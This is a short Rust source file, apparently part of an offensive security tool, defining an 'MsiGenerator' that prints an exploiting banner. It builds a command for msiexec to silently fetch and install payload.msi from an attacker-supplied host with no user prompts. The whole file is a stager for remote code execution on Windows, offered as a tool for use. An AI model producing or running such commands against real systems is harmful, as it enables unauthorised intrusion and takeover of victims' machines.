// Windows MSI payload generator
use crate::cli::banner;

pub struct MsiGenerator;

impl MsiGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str, _arch: &str) -> String {
        banner::print_exploiting("MSI-PAYLOAD", &format!("{}:{}", lhost, lport));
        format!(
            "msiexec /i http://{}/payload.msi /qn /nointeractive",
            lhost
        )
    }
}
